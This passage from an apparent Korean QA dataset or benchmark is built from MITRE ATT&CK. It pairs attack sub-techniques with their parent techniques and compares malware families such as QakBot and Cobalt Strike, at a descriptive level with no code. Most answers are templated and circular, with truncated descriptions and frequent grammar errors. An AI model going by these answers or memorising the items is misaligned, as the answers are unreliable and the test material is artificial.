      "answer": "Control Panel Items와 System Binary Proxy Execution는 Control Panel를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "LSASS Driver와 Boot or Logon Autostart Execution의 관계는 무엇인가?",
      "answer": "LSASS Driver와 Boot or Logon Autostart Execution는 LSASS Driver를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Dylib Hijacking와 Hijack Execution Flow의 관계는 무엇인가?",
      "answer": "Dylib Hijacking와 Hijack Execution Flow는 Dylib Hijacking를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Startup Items와 Boot or Logon Initialization Scripts의 관계는 무엇인가?",
      "answer": "Startup Items와 Boot or Logon Initialization Scripts는 Startup Items를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Extra Window Memory Injection와 Process Injection의 관계는 무엇인가?",
      "answer": "Extra Window Memory Injection와 Process Injection는 Extra Window Memory Injection를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Network Share Connection Removal와 Indicator Removal의 관계는 무엇인가?",
      "answer": "Network Share Connection Removal와 Indicator Removal는 Network Share Connection Removal를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Disk Content Wipe와 Disk Wipe의 관계는 무엇인가?",
      "answer": "Disk Content Wipe와 Disk Wipe는 Disk Content Wipe를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Keychain와 Credentials from Password Stores의 관계는 무엇인가?",
      "answer": "Keychain와 Credentials from Password Stores는 Keychain를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Remote Desktop Protocol와 Remote Services의 관계는 무엇인가?",
      "answer": "Remote Desktop Protocol와 Remote Services는 Remote Desktop Protocol를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Domain Fronting와 Proxy의 관계는 무엇인가?",
      "answer": "Domain Fronting와 Proxy는 Domain Fronting를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "AppInit DLLs와 Event Triggered Execution의 관계는 무엇인가?",
      "answer": "AppInit DLLs와 Event Triggered Execution는 AppInit DLLs를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Launch Daemon와 Create or Modify System Process의 관계는 무엇인가?",
      "answer": "Launch Daemon와 Create or Modify System Process는 Launch Daemon를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Web Shell와 Server Software Component의 관계는 무엇인가?",
      "answer": "Web Shell와 Server Software Component는 Web Shell를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Space after Filename와 Masquerading의 관계는 무엇인가?",
      "answer": "Space after Filename와 Masquerading는 Space after Filename를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Install Root Certificate와 Subvert Trust Controls의 관계는 무엇인가?",
      "answer": "Install Root Certificate와 Subvert Trust Controls는 Install Root Certificate를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Component Firmware와 Pre-OS Boot의 관계는 무엇인가?",
      "answer": "Component Firmware와 Pre-OS Boot는 Component Firmware를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Bootkit와 Pre-OS Boot의 관계는 무엇인가?",
      "answer": "Bootkit와 Pre-OS Boot는 Bootkit를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "CMSTP와 System Binary Proxy Execution의 관계는 무엇인가?",
      "answer": "CMSTP와 System Binary Proxy Execution는 CMSTP를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Registry Run Keys / Startup Folder와 Boot or Logon Autostart Execution의 관계는 무엇인가?",
      "answer": "Registry Run Keys / Startup Folder와 Boot or Logon Autostart Execution는 Registry Run Keys / Startup Folder를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Mshta와 System Binary Proxy Execution의 관계는 무엇인가?",
      "answer": "Mshta와 System Binary Proxy Execution는 Mshta를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Setuid and Setgid와 Abuse Elevation Control Mechanism의 관계는 무엇인가?",
      "answer": "Setuid and Setgid와 Abuse Elevation Control Mechanism는 Setuid and Setgid를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Authentication Package와 Boot or Logon Autostart Execution의 관계는 무엇인가?",
      "answer": "Authentication Package와 Boot or Logon Autostart Execution는 Authentication Package를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Windows Management Instrumentation Event Subscription와 Event Triggered Execution의 관계는 무엇인가?",
      "answer": "Windows Management Instrumentation Event Subscription와 Event Triggered Execution는 Windows Management Instrumentation Event Subscription를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Password Filter DLL와 Modify Authentication Process의 관계는 무엇인가?",
      "answer": "Password Filter DLL와 Modify Authentication Process는 Password Filter DLL를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Regsvr32와 System Binary Proxy Execution의 관계는 무엇인가?",
      "answer": "Regsvr32와 System Binary Proxy Execution는 Regsvr32를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Shortcut Modification와 Boot or Logon Autostart Execution의 관계는 무엇인가?",
      "answer": "Shortcut Modification와 Boot or Logon Autostart Execution는 Shortcut Modification를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Pass the Hash와 Use Alternate Authentication Material의 관계는 무엇인가?",
      "answer": "Pass the Hash와 Use Alternate Authentication Material는 Pass the Hash를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Winlogon Helper DLL와 Boot or Logon Autostart Execution의 관계는 무엇인가?",
      "answer": "Winlogon Helper DLL와 Boot or Logon Autostart Execution는 Winlogon Helper DLL를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Modify Existing Service와 Create or Modify System Process의 관계는 무엇인가?",
      "answer": "Modify Existing Service와 Create or Modify System Process는 Windows Service를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "DLL Search Order Hijacking와 Hijack Execution Flow의 관계는 무엇인가?",
      "answer": "DLL Search Order Hijacking와 Hijack Execution Flow는 DLL를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Gatekeeper Bypass와 Subvert Trust Controls의 관계는 무엇인가?",
      "answer": "Gatekeeper Bypass와 Subvert Trust Controls는 Gatekeeper Bypass를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Security Support Provider와 Boot or Logon Autostart Execution의 관계는 무엇인가?",
      "answer": "Security Support Provider와 Boot or Logon Autostart Execution는 Security Support Provider를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Application Shimming와 Event Triggered Execution의 관계는 무엇인가?",
      "answer": "Application Shimming와 Event Triggered Execution는 Application Shimming를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Disabling Security Tools와 Impair Defenses의 관계는 무엇인가?",
      "answer": "Disabling Security Tools와 Impair Defenses는 Disable or Modify Tools를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "SSH Hijacking와 Remote Service Session Hijacking의 관계는 무엇인가?",
      "answer": "SSH Hijacking와 Remote Service Session Hijacking는 SSH Hijacking를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "DLL Side-Loading와 DLL의 관계는 무엇인가?",
      "answer": "DLL Side-Loading와 DLL는 DLL Side-Loading를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Process Hollowing와 Process Injection의 관계는 무엇인가?",
      "answer": "Process Hollowing와 Process Injection는 Process Hollowing를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "DLL Side-Loading와 Hijack Execution Flow의 관계는 무엇인가?",
      "answer": "DLL Side-Loading와 Hijack Execution Flow는 DLL Side-Loading → DLL를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 3
      }
    },
    {
      "question": "Software Packing와 Obfuscated Files or Information의 관계는 무엇인가?",
      "answer": "Software Packing와 Obfuscated Files or Information는 Software Packing를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Compiled HTML File와 System Binary Proxy Execution의 관계는 무엇인가?",
      "answer": "Compiled HTML File와 System Binary Proxy Execution는 Compiled HTML File를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "System Firmware와 Pre-OS Boot의 관계는 무엇인가?",
      "answer": "System Firmware와 Pre-OS Boot는 System Firmware를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Port Monitors와 Boot or Logon Autostart Execution의 관계는 무엇인가?",
      "answer": "Port Monitors와 Boot or Logon Autostart Execution는 Port Monitors를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Re-opened Applications와 Boot or Logon Autostart Execution의 관계는 무엇인가?",
      "answer": "Re-opened Applications와 Boot or Logon Autostart Execution는 Re-opened Applications를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "AppCert DLLs와 Event Triggered Execution의 관계는 무엇인가?",
      "answer": "AppCert DLLs와 Event Triggered Execution는 AppCert DLLs를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Rundll32와 System Binary Proxy Execution의 관계는 무엇인가?",
      "answer": "Rundll32와 System Binary Proxy Execution는 Rundll32를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "DLL Side-Loading와 Hijack Execution Flow의 관계는 무엇인가?",
      "answer": "DLL Side-Loading와 Hijack Execution Flow는 DLL Side-Loading를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "New Service와 Create or Modify System Process의 관계는 무엇인가?",
      "answer": "New Service와 Create or Modify System Process는 Windows Service를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Hooking와 Input Capture의 관계는 무엇인가?",
      "answer": "Hooking와 Input Capture는 Credential API Hooking를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Service Execution와 System Services의 관계는 무엇인가?",
      "answer": "Service Execution와 System Services는 Service Execution를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Elevated Execution with Prompt와 Abuse Elevation Control Mechanism의 관계는 무엇인가?",
      "answer": "Elevated Execution with Prompt와 Abuse Elevation Control Mechanism는 Elevated Execution with Prompt를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Hidden Files and Directories와 Hide Artifacts의 관계는 무엇인가?",
      "answer": "Hidden Files and Directories와 Hide Artifacts는 Hidden Files and Directories를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Dynamic Data Exchange와 Inter-Process Communication의 관계는 무엇인가?",
      "answer": "Dynamic Data Exchange와 Inter-Process Communication는 Dynamic Data Exchange를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Accessibility Features와 Event Triggered Execution의 관계는 무엇인가?",
      "answer": "Accessibility Features와 Event Triggered Execution는 Accessibility Features를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Windows Remote Management와 Remote Services의 관계는 무엇인가?",
      "answer": "Windows Remote Management와 Remote Services는 Windows Remote Management를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Launchctl와 System Services의 관계는 무엇인가?",
      "answer": "Launchctl와 System Services는 Launchctl를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Stored Data Manipulation와 Data Manipulation의 관계는 무엇인가?",
      "answer": "Stored Data Manipulation와 Data Manipulation는 Stored Data Manipulation를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Sudo Caching와 Abuse Elevation Control Mechanism의 관계는 무엇인가?",
      "answer": "Sudo Caching와 Abuse Elevation Control Mechanism는 Sudo and Sudo Caching를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "TrickBot와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "TrickBot와 QakBot는 36개의 공통 요소를 가지고 있다. TrickBot는 [TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program written in C++ that ... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 36
      }
    },
    {
      "question": "InvisiMole와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 QakBot는 36개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 36
      }
    },
    {
      "question": "InvisiMole와 PlugX의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 PlugX는 34개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... PlugX는 [PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) with modular plugins ...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 34
      }
    },
    {
      "question": "Cobalt Strike와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Cobalt Strike와 QakBot는 33개의 공통 요소를 가지고 있다. Cobalt Strike는 [Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote acce... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 33
      }
    },
    {
      "question": "InvisiMole와 Cobalt Strike의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 Cobalt Strike는 33개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... Cobalt Strike는 [Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote acce...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 33
      }
    },
    {
      "question": "Bazar와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Bazar와 QakBot는 32개의 공통 요소를 가지고 있다. Bazar는 [Bazar](https://attack.mitre.org/software/S0534) is a downloader and backdoor that has been used sin... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 32
      }
    },
    {
      "question": "PlugX와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "PlugX와 QakBot는 31개의 공통 요소를 가지고 있다. PlugX는 [PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) with modular plugins ... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 31
      }
    },
    {
      "question": "Latrodectus와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Latrodectus와 QakBot는 31개의 공통 요소를 가지고 있다. Latrodectus는 [Latrodectus](https://attack.mitre.org/software/S1160) is a Windows malware downloader that has been... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 31
      }
    },
    {
      "question": "NETWIRE와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "NETWIRE와 QakBot는 30개의 공통 요소를 가지고 있다. NETWIRE는 [NETWIRE](https://attack.mitre.org/software/S0198) is a publicly available, multiplatform remote adm... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 30
      }
    },
    {
      "question": "Metamorfo와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Metamorfo와 QakBot는 29개의 공통 요소를 가지고 있다. Metamorfo는 [Metamorfo](https://attack.mitre.org/software/S0455) is a Latin-American banking trojan operated by ... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 29
      }
    },
    {
      "question": "Grandoreiro와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Grandoreiro와 QakBot는 29개의 공통 요소를 가지고 있다. Grandoreiro는 [Grandoreiro](https://attack.mitre.org/software/S0531) is a banking trojan written in Delphi that wa... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 29
      }
    },
    {
      "question": "Emotet와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Emotet와 QakBot는 29개의 공통 요소를 가지고 있다. Emotet는 [Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily us... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 29
      }
    },
    {
      "question": "DarkGate와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "DarkGate와 QakBot는 28개의 공통 요소를 가지고 있다. DarkGate는 [DarkGate](https://attack.mitre.org/software/S1111) first emerged in 2018 and has evolved into an in... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 28
      }
    },
    {
      "question": "TrickBot와 Bazar의 유사점과 차이점을 비교하라.",
      "answer": "TrickBot와 Bazar는 28개의 공통 요소를 가지고 있다. TrickBot는 [TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program written in C++ that ... Bazar는 [Bazar](https://attack.mitre.org/software/S0534) is a downloader and backdoor that has been used sin...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 28
      }
    },
    {
      "question": "Latrodectus와 Bazar의 유사점과 차이점을 비교하라.",
      "answer": "Latrodectus와 Bazar는 28개의 공통 요소를 가지고 있다. Latrodectus는 [Latrodectus](https://attack.mitre.org/software/S1160) is a Windows malware downloader that has been... Bazar는 [Bazar](https://attack.mitre.org/software/S0534) is a downloader and backdoor that has been used sin...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 28
      }
    },
    {
      "question": "InvisiMole와 FunnyDream의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 FunnyDream는 27개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... FunnyDream는 [FunnyDream](https://attack.mitre.org/software/S1044) is a backdoor with multiple components that wa...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 27
      }
    },
    {
      "question": "TrickBot와 InvisiMole의 유사점과 차이점을 비교하라.",
      "answer": "TrickBot와 InvisiMole는 27개의 공통 요소를 가지고 있다. TrickBot는 [TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program written in C++ that ... InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 27
      }
    },
    {
      "question": "Saint Bot와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Saint Bot와 QakBot는 27개의 공통 요소를 가지고 있다. Saint Bot는 [Saint Bot](https://attack.mitre.org/software/S1018) is a .NET downloader that has been used by [Sai... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 27
      }
    },
    {
      "question": "KONNI와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "KONNI와 QakBot는 27개의 공통 요소를 가지고 있다. KONNI는 [KONNI](https://attack.mitre.org/software/S0356) is a remote access tool that security researchers a... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 27
      }
    },
    {
      "question": "InvisiMole와 Bazar의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 Bazar는 26개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... Bazar는 [Bazar](https://attack.mitre.org/software/S0534) is a downloader and backdoor that has been used sin...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 26
      }
    },
    {
      "question": "InvisiMole와 Metamorfo의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 Metamorfo는 26개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... Metamorfo는 [Metamorfo](https://attack.mitre.org/software/S0455) is a Latin-American banking trojan operated by ...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 26
      }
    },
    {
      "question": "Bumblebee와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Bumblebee와 QakBot는 26개의 공통 요소를 가지고 있다. Bumblebee는 [Bumblebee](https://attack.mitre.org/software/S1039) is a custom loader written in C++ that has been... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 26
      }
    },
    {
      "question": "InvisiMole와 KONNI의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 KONNI는 26개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... KONNI는 [KONNI](https://attack.mitre.org/software/S0356) is a remote access tool that security researchers a...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 26
      }
    },
    {
      "question": "Bumblebee와 Saint Bot의 유사점과 차이점을 비교하라.",
      "answer": "Bumblebee와 Saint Bot는 26개의 공통 요소를 가지고 있다. Bumblebee는 [Bumblebee](https://attack.mitre.org/software/S1039) is a custom loader written in C++ that has been... Saint Bot는 [Saint Bot](https://attack.mitre.org/software/S1018) is a .NET downloader that has been used by [Sai...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 26
      }
    },
    {
      "question": "InvisiMole와 Clambling의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 Clambling는 26개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... Clambling는 [Clambling](https://attack.mitre.org/software/S0660) is a modular backdoor written in C++ that has b...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 26
      }
    },
    {
      "question": "Bisonal와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Bisonal와 QakBot는 26개의 공통 요소를 가지고 있다. Bisonal는 [Bisonal](https://attack.mitre.org/software/S0268) is a remote access tool (RAT) that has been used ... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 26
      }
    },
    {
      "question": "TrickBot와 Emotet의 유사점과 차이점을 비교하라.",
      "answer": "TrickBot와 Emotet는 26개의 공통 요소를 가지고 있다. TrickBot는 [TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program written in C++ that ... Emotet는 [Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily us...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 26
      }
    },
    {
      "question": "InvisiMole와 Ramsay의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 Ramsay는 26개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... Ramsay는 [Ramsay](https://attack.mitre.org/software/S0458) is an information stealing malware framework desig...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 26
      }
    },
    {
      "question": "TONESHELL와 InvisiMole의 유사점과 차이점을 비교하라.",
      "answer": "TONESHELL와 InvisiMole는 26개의 공통 요소를 가지고 있다. TONESHELL는 [TONESHELL](https://attack.mitre.org/software/S1239) is a custom backdoor that has been used since a... InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 26
      }
    },
    {
      "question": "Astaroth와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Astaroth와 QakBot는 25개의 공통 요소를 가지고 있다. Astaroth는 [Astaroth](https://attack.mitre.org/software/S0373) is a Trojan and information stealer known to aff... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 25
      }
    },
    {
      "question": "Clambling와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Clambling와 QakBot는 25개의 공통 요소를 가지고 있다. Clambling는 [Clambling](https://attack.mitre.org/software/S0660) is a modular backdoor written in C++ that has b... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 25
      }
    },
    {
      "question": "InvisiMole와 Attor의 유사점과 차이점을 비교하라.",
